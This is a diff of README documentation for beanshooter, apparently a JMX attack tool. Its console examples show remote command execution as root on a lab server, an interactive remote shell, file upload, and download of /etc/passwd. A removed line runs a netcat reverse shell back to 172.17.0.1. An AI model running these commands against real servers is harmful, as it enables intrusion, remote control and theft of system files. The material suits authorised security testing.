@@ -576,30 +576,34 @@ fee2d783023b
 For convenience, common shells are automatically suffixed with the required command string argument.
 Therefore, `--shell ash` is automatically converted to `--shell 'ash -c'`.
 
-#### Tonka Background
+#### Tonka Execarray
 
-The `background` action executes a single command on the *JMX* server and does not wait for the command
-to finish:
+The `execarray` operation is very similar to the `exec` action, but instead of expecting a string as argument
+and splitting this string on spaces to construct the command array, the `execarray` operation allows multiple
+arguments to be specified that are used directly as the command array for the `ProcessBuilder` class:
 
 ```console
-[qtc@devbox ~]$ beanshooter tonka background 172.17.0.2 9010 'nc 172.17.0.1 4444 -e ash'
-[+] Invoking the executeCommand method with argument: [Ljava.lang.String;@16293aa2
+[qtc@devbox ~]$ beanshooter tonka execarray 172.17.0.2 9010 -- ash -c 'echo $HOME'
+[+] Invoking the executeCommand method with argument: ash -c echo $HOME
 [+] The call was successful
+[+]
+[+] Server response:
+/root
 ```
 
 #### Tonka Shell
 
 The `shell` action spawns a command shell where you can specify commands that are executed on the *JMX*
 server. The shell is not fully interactive and just represents a wrapper around *Javas* `Runtime.exec`
-method. However, basic support for environment variables and directory changing is implemented:
+method. However, basic support for environment variables and a current working directory is implemented:
 
 ```console
-[qtc@devbox ~]$ beanshooter tonka shell 172.17.0.2 9010 
+[qtc@devbox ~]$ beanshooter tonka shell 172.17.0.2 9010
 [root@172.17.0.2 /]$ id
 uid=0(root) gid=0(root) groups=0(root)
-[root@172.17.0.2 /]$ cd home
+[root@172.17.0.2 /]$ cd /home
 [root@172.17.0.2 /home]$ !env test=example
-[root@172.17.0.2 /home]$ sh -c "echo $test"
+[root@172.17.0.2 /home]$ echo $test
 example
 ```
 
@@ -607,17 +611,17 @@ The example above demonstrates how to set environment variables using the `!env`
 keyword, several others are available:
 
 ```console
-[qtc@devbox ~]$ beanshooter tonka shell 172.17.0.2 9010 
+[qtc@devbox ~]$ beanshooter tonka shell 172.17.0.2 9010
 [root@172.17.0.2 /]$ !help
 Available shell commands:
   <cmd>                        execute the specified command
   cd <dir>                     change working directory on the server
   exit|quit                    exit the shell
-  !help                        print this help menu
-  !env <env-str>               set new environment variables in key=value format
-  !upload <src> <dst>          upload a file to the remote MBeanServer
-  !download <src> <dst>        download a file from the remote MBeanServer
-  !background <cmd>            executes the specified command in the background
+  !help|!h                     print this help menu
+  !environ|!env <key>=<value>  set new environment variables in key=value format
+  !upload|!put <src> <dst>     upload a file to the remote MBeanServer
+  !download|!get <src> <dst>   download a file from the remote MBeanServer
+  !background|!back <cmd>      executes the specified command in the background
 ```
 
 #### Tonka Upload
@@ -625,9 +629,9 @@ Available shell commands:
 The `upload` action can be used to upload a file to the *JMX* server:
 
 ```console
-[qtc@devbox ~]$ beanshooter tonka upload 172.17.0.2 9010 ./file.dat /
-[+] Uploading local file /home/qtc/file.dat to path /file.dat on the MBeanSerer.
-[+] 30001 bytes uploaded successfully
+[qtc@devbox ~]$ beanshooter tonka upload 172.17.0.2 9010 file.dat /tmp
+[+] Uploading local file /home/qtc/file.dat to path /tmp on the MBeanSerer.
+[+] 33 bytes were written to /tmp/file.dat
 ```
 
 #### Tonka Download
@@ -635,9 +639,9 @@ The `upload` action can be used to upload a file to the *JMX* server:
 The `download` action can be used to download a file from the *JMX* server:
 
 ```console
-[qtc@devbox ~]$ beanshooter tonka download 172.17.0.2 9010 /etc/passwd .
+[qtc@devbox ~]$ beanshooter tonka download 172.17.0.2 9010 /etc/passwd
 [+] Saving remote file /etc/passwd to local path /home/qtc/passwd
-[+] 1172 bytes were written.
+[+] 1172 bytes were written to /home/qtc/passwd
 ```
 
 
